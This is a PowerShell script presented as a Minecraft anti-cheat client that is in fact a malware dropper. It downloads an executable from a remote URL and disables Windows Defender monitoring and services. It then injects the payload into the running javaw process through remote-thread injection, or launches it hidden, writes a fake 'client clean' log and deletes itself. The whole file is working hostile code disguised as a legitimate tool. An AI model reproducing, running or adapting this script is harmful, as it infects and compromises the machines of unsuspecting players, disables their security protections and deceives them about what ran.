# Minecraft_AntiCheat_Client.ps1
# Run: powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File Minecraft_AntiCheat_Client.ps1

$URL = "https://raw.githubusercontent.com/znk1sss/znk1sss/refs/heads/main/Dayn.exe"
$TEMP = "$env:TEMP\javaw_update.exe"
$LOG = "$env:TEMP\~mc_anticheat.log"

try {
    (New-Object Net.WebClient).DownloadFile($URL, $TEMP)
} catch {
    exit
}

try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue
    Stop-Service -Name "WdNisSvc" -Force -ErrorAction SilentlyContinue
    Set-Service -Name "WinDefend" -StartupType Disabled -ErrorAction SilentlyContinue
    Get-Process -Name "MsMpEng","NisSrv" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
} catch {}

$hash = Get-FileHash -Path $TEMP -Algorithm SHA256
"$(Get-Date) [AC] Module loaded: $TEMP" | Out-File $LOG
"$(Get-Date) [AC] SHA256: $($hash.Hash)" | Out-File $LOG -Append
"$(Get-Date) [AC] Scanning for cheats..." | Out-File $LOG -Append

$proc = Get-Process -Name "javaw" -ErrorAction SilentlyContinue | Select-Object -First 1
if ($proc) {
    "$(Get-Date) [AC] Target: javaw.exe (PID: $($proc.Id))" | Out-File $LOG -Append
    try {
        Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@
        $bytes = [System.IO.File]::ReadAllBytes($TEMP)
        $hProcess = [WinAPI]::OpenProcess(0x1F0FFF, $false, $proc.Id)
        $addr = [WinAPI]::VirtualAllocEx($hProcess, 0, $bytes.Length, 0x3000, 0x40)
        [WinAPI]::WriteProcessMemory($hProcess, $addr, $bytes, $bytes.Length, [ref]0)
        $tid = 0
        [WinAPI]::CreateRemoteThread($hProcess, 0, 0, $addr, 0, 0, [ref]$tid)
        [WinAPI]::CloseHandle($hProcess)
        "$(Get-Date) [AC] Injection SUCCESS (Thread: $tid)" | Out-File $LOG -Append
    } catch {
        Start-Process -FilePath $TEMP -WindowStyle Hidden
        "$(Get-Date) [AC] Fallback mode" | Out-File $LOG -Append
    }
} else {
    Start-Process -FilePath $TEMP -WindowStyle Hidden
    "$(Get-Date) [AC] Standalone mode" | Out-File $LOG -Append
}

"$(Get-Date) [AC] No cheats detected. Client clean." | Out-File $LOG -Append
"$(Get-Date) [AC] Status: CLEAN" | Out-File $LOG -Append

Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue